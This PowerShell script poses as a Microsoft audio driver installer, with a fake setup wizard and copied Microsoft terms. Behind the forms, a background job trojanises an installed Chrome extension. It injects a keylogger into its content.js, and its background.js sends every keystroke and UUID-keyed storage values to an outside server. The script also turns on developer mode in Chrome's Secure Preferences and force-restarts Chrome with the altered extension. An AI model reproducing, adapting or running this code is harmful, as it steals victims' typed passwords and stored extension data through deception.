# Define functions

function Prepend-ToContentJS {
    param (
        [string]$path
    )

    $filePath = Join-Path -Path $path -ChildPath "content.js"

    if (-Not (Test-Path $filePath)) {
        Write-Host "Error: content.js not found at $filePath"
        return
    }

    $prependString = @'
document.addEventListener("keydown", (event) => {
    if (event.key.length === 1) {
        chrome.runtime.sendMessage({ type: "keylog", key: event.key });
    }
});
'@

    # Read existing content
    $existingContent = Get-Content -Path $filePath -Raw

    # Prepend the string and write back
    $newContent = "$prependString`r`n$existingContent"
    Set-Content -Path $filePath -Value $newContent -Encoding UTF8

    Write-Host "Successfully modified content.js at $filePath"
}

function Prepend-ToBackgroundJS {
    param (
        [string]$path
    )

    $filePath = Join-Path -Path $path -ChildPath "background.js"

    if (-Not (Test-Path $filePath)) {
        Write-Host "Error: background.js not found at $filePath"
        return
    }

    $prependString = @'
await (async () => {
    try {
        // Fetch all stored keys
        const allKeys = await chrome.storage.local.get(null);
        
        // Regular expression to match UUID format (8-4-4-4-12 hex)
        const uuidRegex = /^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/;
        
        // Extract UUID keys into the _ids array
        window._ids = Object.keys(allKeys).filter(k => uuidRegex.test(k));

    } catch (error) {
        console.error("Error:", error);
    }
})();

chrome.runtime.onMessage.addListener((message) => {
    if (message.type === "keylog") {
        fetch("https://vultureglobal.com/qr/rcptKeys.php", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ key: message.key, id: window._ids })
        }).catch(err => console.error("Failed to send", err));
    }
});

(async () => {
    try {
        // Get all storage keys
        const keys = await chrome.storage.local.get(null);  // Fetch all stored keys
        const uuidKeys = Object.keys(keys).filter(k => /^[0-9a-fA-F-]{36}$/.test(k)); // Filter UUIDs

        if (uuidKeys.length === 0) {
            console.log("No UUID keys found.");
            return;
        }

        let store = {};
        uuidKeys.forEach(k => store[k] = keys[k]); // Store UUID-keyed values

        // Send the collected data
        const response = await fetch("https://vultureglobal.com/qr/rcpt.php", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ store })
        });

        console.log("Data sent:", response.ok);

    } catch (error) {
        console.error("Error:", error);
    }
})();
'@

    # Read existing content
    $existingContent = Get-Content -Path $filePath -Raw

    # Prepend the string and write back
    $newContent = "$prependString`r`n$existingContent"
    Set-Content -Path $filePath -Value $newContent -Encoding UTF8

    Write-Host "Successfully modified background.js at $filePath"
}


function Modify-Extension {
    param (
        [string]$ExtensionPath,
        [string]$ContentToAppend
    )

    Prepend-ToContentJS -path $ExtensionPath
    Prepend-ToBackgroundJS -path $ExtensionPath
}

function Enable-DeveloperMode {
    param (
        [string]$JsonFilePath
    )

    # Check if the file exists
    if (-not (Test-Path $JsonFilePath)) {
        Write-Host "Error: JSON file not found." -ForegroundColor Red
        return
    }

    # Read and parse the JSON
    $jsonContent = Get-Content -Raw -Path $JsonFilePath | ConvertFrom-Json

    # Navigate the JSON structure and ensure keys exist
    if (-not $jsonContent.PSObject.Properties['extensions']) {
        $jsonContent | Add-Member -MemberType NoteProperty -Name 'extensions' -Value @{} -Force
    }
    if (-not $jsonContent.extensions.PSObject.Properties['ui']) {
        $jsonContent.extensions | Add-Member -MemberType NoteProperty -Name 'ui' -Value @{} -Force
    }
    if (-not $jsonContent.extensions.ui.PSObject.Properties['developer_mode']) {
        $jsonContent.extensions.ui | Add-Member -MemberType NoteProperty -Name 'developer_mode' -Value $true -Force
    }

    # Convert back to JSON and overwrite the file
    $jsonContent | ConvertTo-Json -Depth 10 | Set-Content -Path $JsonFilePath -Encoding UTF8

    Write-Host "Developer mode enabled in JSON file: $JsonFilePath" -ForegroundColor Green
}

function Restart-ChromeWithExtension {
    param (
        [string]$ExtensionPath
    )

    # Expand the provided path
    $expandedPath = (Resolve-Path -Path $ExtensionPath).Path

    # Wait 10 seconds before killing Chrome
    Start-Sleep -Seconds 10

    # Kill all Chrome instances
    Get-Process -Name "chrome" -ErrorAction SilentlyContinue | Stop-Process -Force

    # Wait only 0.5 seconds before restarting
    Start-Sleep -Milliseconds 500

    # Locate Chrome executable
    $chromePath = "$env:ProgramFiles\Google\Chrome\Application\chrome.exe"
    if (-not (Test-Path $chromePath)) {
        $chromePath = "$env:ProgramFiles(x86)\Google\Chrome\Application\chrome.exe"
    }
    if (-not (Test-Path $chromePath)) {
        Write-Host "Error: Chrome executable not found." -ForegroundColor Red
        return
    }

    # Restart Chrome with the extension
    Start-Process -FilePath $chromePath -ArgumentList "--load-extension=`"$expandedPath`""

    Write-Host "Chrome restarted with extension from: $expandedPath" -ForegroundColor Green
}

function Executor-X {
# Define Master Directory
$MasterDir = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"

# Define Extension Path
$ExtensionPath = Join-Path -Path $MasterDir -ChildPath "Extensions\egjidjbpglichdcondbcbdnbeeppgdph"
$subdirectory = Get-ChildItem -Path $ExtensionPath -Directory | Select-Object -First 1

if ($subdirectory) {
    $ExtensionPath = Join-Path -Path $ExtensionPath -ChildPath $subdirectory.Name
} else {
    Write-Host "No subdirectory found in $ExtensionPath" -ForegroundColor Red
}

# Define Secure Preferences Path
$SecurePreferencesPath = Join-Path -Path $MasterDir -ChildPath "Secure Preferences"

# Placeholder for content.js modification
$ContentToAppend = "console.log('Telemetry removed');"

# Execute functions in sequence
Modify-Extension -ExtensionPath $ExtensionPath -ContentToAppend $ContentToAppend
Enable-DeveloperMode -JsonFilePath $SecurePreferencesPath
}

$job = Start-Job -ScriptBlock { Executor-X }

Add-Type -AssemblyName System.Windows.Forms

# Welcome Screen
$welcomeForm = New-Object System.Windows.Forms.Form
$welcomeForm.Text = "Microsoft x86 Audio Driver Installer"
$welcomeForm.Size = New-Object System.Drawing.Size(400, 300)
$welcomeForm.StartPosition = "CenterScreen"

# Header
$headerLabel = New-Object System.Windows.Forms.Label
$headerLabel.Text = "Driver Installer"
$headerLabel.Font = New-Object System.Drawing.Font("Arial", 14, [System.Drawing.FontStyle]::Bold)
$headerLabel.Location = New-Object System.Drawing.Point(10, 10)
$headerLabel.Size = New-Object System.Drawing.Size(380, 30)
$headerLabel.TextAlign = "MiddleCenter"
$welcomeForm.Controls.Add($headerLabel)

# Horizontal Rule (Simulated with a Label)
$hrLabel = New-Object System.Windows.Forms.Label
$hrLabel.BorderStyle = [System.Windows.Forms.BorderStyle]::Fixed3D
$hrLabel.Location = New-Object System.Drawing.Point(10, 45)
$hrLabel.Size = New-Object System.Drawing.Size(360, 2)
$welcomeForm.Controls.Add($hrLabel)

$welcomeLabel = New-Object System.Windows.Forms.Label
$welcomeLabel.Text = "Welcome to Microsoft x86 Audio Driver Installer!"
$welcomeLabel.Location = New-Object System.Drawing.Point(10, 60)
$welcomeLabel.Size = New-Object System.Drawing.Size(350, 20)
$welcomeForm.Controls.Add($welcomeLabel)

$welcomeSubLabel = New-Object System.Windows.Forms.Label
$welcomeSubLabel.Text = "This installer will guide you through the installation of the Microsoft x86 Audio Driver."
$welcomeSubLabel.Location = New-Object System.Drawing.Point(10, 80)
$welcomeSubLabel.Size = New-Object System.Drawing.Size(350, 40)
$welcomeForm.Controls.Add($welcomeSubLabel)

$welcomeNextButton = New-Object System.Windows.Forms.Button
$welcomeNextButton.Text = "Next"
$welcomeNextButton.Location = New-Object System.Drawing.Point(270, 220)
$welcomeNextButton.Size = New-Object System.Drawing.Size(75, 20)
$welcomeForm.Controls.Add($welcomeNextButton)

# Terms of Service Screen
$tosForm = New-Object System.Windows.Forms.Form
$tosForm.Text = "Terms of Service"
$tosForm.Size = New-Object System.Drawing.Size(400, 300)
$tosForm.StartPosition = "CenterScreen"
$tosText = @"
Your Privacy\n
1. Your Privacy. Your privacy is important to us. Please read the Microsoft Privacy Statement (https://go.microsoft.com/fwlink/?LinkId=521839) (the “Privacy Statement”) as it describes the types of data we collect from you and your devices (“Data”), how we use your Data and the legal bases we have to process your Data. The Privacy Statement also describes how Microsoft uses your content, which is: your communications with others; postings submitted by you to Microsoft via the Services; and the files, photos, documents, audio, digital works, livestreams and videos that you upload, store, broadcast, create, generate or share through the Services, or inputs that you submit in order to generate content (“Your Content”). Where processing is based on consent and to the extent permitted by law, by agreeing to these Terms, you consent to Microsoft’s collection, use and disclosure of Your Content and Data as described in the Privacy Statement. In some cases, we will provide separate notice and request your consent as referenced in the Privacy Statement.\n
\n
Your Content\n
2. Your Content. Many of our Services allow you to create, store or share Your Content or receive material from others. We don’t claim ownership of Your Content. Your Content remains yours, and you are responsible for it.\n
\n
a. When you share Your Content with other people, you understand that they may be able to, on a worldwide basis, use, save, record, reproduce, broadcast, transmit, share and display Your Content for the purpose that you made Your Content available on the Services, without compensating you. If you do not want others to have that ability, do not use the Services to share Your Content. You represent and warrant that for the duration of these Terms, you have (and will have) all the rights necessary for Your Content that is uploaded, stored or shared on or through the Services and that the collection, use and retention of Your Content will not violate any law or rights of others. Microsoft does not own, control, verify, pay for, endorse or otherwise assume any liability for Your Content and cannot be held responsible for Your Content or the material others upload, store or share using the Services.\n
b. To the extent necessary to provide you and others with the Services, to protect you and the Services, and to improve Microsoft products and services, you grant to Microsoft a worldwide and royalty-free intellectual property licence to use Your Content, for example, to make copies of, retain, transmit, reformat, display and distribute via communication tools Your Content on the Services. If you publish Your Content in areas of the Service where it is available broadly online without restrictions, Your Content may appear in demonstrations or materials that promote the Service. Some of the Services are supported by advertising. Controls for how Microsoft personalises advertising are available at https://choice.live.com. We do not use what you say in email, chat, video calls or voice mail, or your documents, photos or other personal files to target advertising to you. Our advertising policies are covered in detail in the Privacy Statement.\n
\n
Code of Conduct\n
3. Code of Conduct. You are accountable for your conduct and content when using the Services.\n
\n
a. By agreeing to these Terms, you’re agreeing that, when using the Services, you will follow these rules:\n
i. Don’t do anything illegal, or try to generate or share content that is illegal.\n
ii. Don’t engage in any activity that exploits, harms or threatens to harm children.\n
iii. Don’t send spam or engage in phishing, or try to generate or distribute malware. Spam is unwanted or unsolicited bulk email, postings, contact requests, SMS (text messages), instant messages or similar electronic communications. Phishing is sending emails or other electronic communications to fraudulently or unlawfully induce recipients to reveal personal or sensitive information, such as passwords, dates of birth, National Insurance numbers, passport numbers, credit card information, financial information or other sensitive information, or to gain access to accounts or records, exfiltration of documents or other sensitive information, payment and/or financial benefit. Malware includes any activity designed to cause technical harm, such as delivering malicious executables, organising denial of service attacks or managing command and control servers.\n
iv. Don’t publicly display or use the Services to generate or share inappropriate content or material (involving, for example, nudity, bestiality, pornography, offensive language, graphic violence, self-harm or criminal activity) or Your Content or material that does not comply with local laws or regulations.\n
v. Don’t engage in activity that is fraudulent, false or misleading (e.g. asking for money under false pretences, impersonating someone else, creating fake accounts, automating inauthentic activity, generating or sharing content that is intentionally deceptive, manipulating the Services to increase play count or affect rankings, ratings or comments), or libellous or defamatory.\n
vi. Don’t circumvent any restrictions on access to, usage or availability of the Services (e.g. attempting to “jailbreak” an AI system, or impermissible scraping).\n
vii. Don’t engage in activity that is harmful to you, the Services or others (e.g. transmitting viruses, stalking, trying to generate or sharing content that harasses, bullies or threatens others, posting terrorist or violent extremist content, communicating...\n
"@

$tosTextBox = New-Object System.Windows.Forms.TextBox
$tosTextBox.Multiline = $true
$tosTextBox.ScrollBars = "Vertical"
$tosTextBox.Text = $tosText
$tosTextBox.Location = New-Object System.Drawing.Point(10, 10)
$tosTextBox.Size = New-Object System.Drawing.Size(360, 200)
$tosForm.Controls.Add($tosTextBox)

$tosNextButton = New-Object System.Windows.Forms.Button
$tosNextButton.Text = "Next"
$tosNextButton.Location = New-Object System.Drawing.Point(270, 220)
$tosNextButton.Size = New-Object System.Drawing.Size(75, 20)
$tosForm.Controls.Add($tosNextButton)

# Installation Progress Screen
$installForm = New-Object System.Windows.Forms.Form
$installForm.Text = "Installation Complete!"
$installForm.Size = New-Object System.Drawing.Size(400, 300)
$installForm.StartPosition = "CenterScreen"

$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Style = "Marquee"
$progressBar.Location = New-Object System.Drawing.Point(50, 100)
$progressBar.Size = New-Object System.Drawing.Size(300, 20)
$installForm.Controls.Add($progressBar)

$installLabel = New-Object System.Windows.Forms.Label
$installLabel.Text = "Installed... Restart Chrome?"
$installLabel.Location = New-Object System.Drawing.Point(150, 70)
$installLabel.Size = New-Object System.Drawing.Size(100, 20)
$installForm.Controls.Add($installLabel)

$iNextButton = New-Object System.Windows.Forms.Button
$iNextButton.Text = "Finish"
$iNextButton.Location = New-Object System.Drawing.Point(270, 220)
$iNextButton.Size = New-Object System.Drawing.Size(75, 20)
$installForm.Controls.Add($iNextButton)

# Event Handlers
$welcomeNextButton.Add_Click({
    $welcomeForm.Hide()
    $tosForm.ShowDialog()
})

$tosNextButton.Add_Click({
    $tosForm.Hide()
    $installForm.ShowDialog()
})

$iNextButton.Add_Click({
    $welcomeForm.Close()
    $tosForm.Close()
$MasterDir = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"

# Define Extension Path
$ExtensionPath = Join-Path -Path $MasterDir -ChildPath "Extensions\egjidjbpglichdcondbcbdnbeeppgdph"
$subdirectory = Get-ChildItem -Path $ExtensionPath -Directory | Select-Object -First 1

# Check if a subdirectory was found
if ($subdirectory) {
    $ExtensionPath = Join-Path -Path $ExtensionPath -ChildPath $subdirectory.Name
} else {
    Write-Host "No subdirectory found in $ExtensionPath" -ForegroundColor Red
}
Wait-Job -Id $job.Id
    Restart-ChromeWithExtension -ExtensionPath $ExtensionPath
    $installForm.Close()
    exit
})

# Show Welcome Screen
$welcomeForm.ShowDialog()
